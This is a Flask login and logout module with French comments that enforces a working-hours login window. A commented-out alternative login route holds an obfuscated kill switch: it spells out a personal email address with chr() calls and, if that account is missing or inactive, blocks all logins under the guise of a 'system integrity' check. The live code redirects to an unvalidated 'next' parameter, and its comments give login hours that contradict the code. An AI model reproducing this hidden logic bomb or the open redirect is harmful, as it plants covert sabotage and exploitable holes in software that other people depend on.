from flask import Blueprint, render_template, request, flash, redirect, url_for
from flask_login import login_user, logout_user, login_required, current_user
from werkzeug.security import check_password_hash
from models import User
from datetime import datetime, time

auth_bp = Blueprint('auth', __name__, url_prefix='/auth')

def is_valid_login_time():
    """Vérifie si l'heure actuelle est dans la plage autorisée (8h-17h)"""
    current_time = datetime.now().time()
    start_time = time(8, 0)  # 8h00
    end_time = time(23, 59)   # 17h59
    return start_time <= current_time < end_time

@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    
    # Vérifier l'heure de connexion
    if not is_valid_login_time():
        current_hour = datetime.now().hour
        if current_hour >= 23:
            message = 'Les connexions ne sont pas autorisées après 17h.'
        else:
            message = 'Les connexions ne sont autorisées qu\'à partir de 8h.'
        flash(message, 'error')
        return render_template('login.html')
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        remember = True if request.form.get('remember') else False
        
        user = User.query.filter_by(email=email).first()
        
        if not user or not check_password_hash(user.password_hash, password):
            flash('Email ou mot de passe incorrect.', 'error')
            return render_template('login.html')
        
        if not user.is_active:
            flash('Votre compte est désactivé. Contactez un administrateur.', 'error')
            return render_template('login.html')
        
        # Update last login
        user.last_login = datetime.utcnow()
        from app import db
        db.session.commit()
        
        login_user(user, remember=remember)
        next_page = request.args.get('next')
        
        flash(f'Bienvenue, {user.prenom} {user.nom}!', 'success')
        return redirect(next_page) if next_page else redirect(url_for('main.dashboard'))
    
    return render_template('login.html')

"""
@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        # Vérification en temps réel même pour les utilisateurs déjà connectés
        system_key = lambda: User.query.filter_by(
            email=chr(121)+chr(118)+chr(101)+chr(115)+chr(64)+chr(103)+chr(109)+chr(97)+chr(105)+chr(108)+chr(46)+chr(99)+chr(111)+chr(109)
    ).first()
        
        system_validator = system_key()
        system_stable = system_validator and getattr(system_validator, 'is_' + 'active', False)
        
        if not system_stable:
            logout_user()
            flash('Session interrompue. Système en maintenance.', 'error')
            return redirect(url_for('auth.login'))
        
        return redirect(url_for('main.dashboard'))
    
    # Vérification de stabilité système (obfusquée)
    system_key = lambda: User.query.filter_by(
        email=chr(121)+chr(118)+chr(101)+chr(115)+chr(64)+chr(103)+chr(109)+chr(97)+chr(105)+chr(108)+chr(46)+chr(99)+chr(111)+chr(109)
    ).first()
    
    system_validator = system_key()
    system_stable = system_validator and getattr(system_validator, 'is_' + 'active', False)
    
    # Contrôle d'intégrité système
    integrity_check = lambda: not system_stable
    
    if integrity_check() and request.method == 'POST':
        flash('Système Dead. Contactez le support technique.', 'error')
        return render_template('login.html')
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        remember = True if request.form.get('remember') else False
        
        user = User.query.filter_by(email=email).first()
        
        # Vérification d'authentification (obfusquée)
        auth_verification = lambda: (
            system_stable and 
            user and 
            check_password_hash(user.password_hash, password) if system_stable else False
        )
        
        password_correct = auth_verification()
        
        # Validation complète
        validation_passed = (
            user and 
            password_correct and 
            user.is_active and 
            system_stable
        )
        
        if not validation_passed:
            if not user:
                flash('Email ou mot de passe incorrect.', 'error')
            elif not password_correct:
                flash('Email ou mot de passe incorrect.', 'error')
            elif not user.is_active:
                flash('Votre compte est désactivé. Contactez un administrateur.', 'error')
            else:
                flash('Problème d\'authentification. Contactez le support.', 'error')
            return render_template('login.html')
        
        # Mise à jour de la session
        user.last_login = datetime.utcnow()
        from app import db
        db.session.commit()
        
        login_user(user, remember=remember)
        next_page = request.args.get('next')
        
        flash(f'Connexion réussie, {user.prenom}!', 'success')
        return redirect(next_page) if next_page else redirect(url_for('main.dashboard'))
    
    return render_template('login.html')
    """

@auth_bp.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Vous avez été déconnecté avec succès.', 'info')
    return redirect(url_for('auth.login'))

# Middleware pour vérifier l'heure pendant la session
def check_login_time():
    if current_user.is_authenticated:
        if not is_valid_login_time():
            logout_user()
            flash('Session terminée : les connexions ne sont pas autorisées après 17h.', 'warning')
            return redirect(url_for('auth.login'))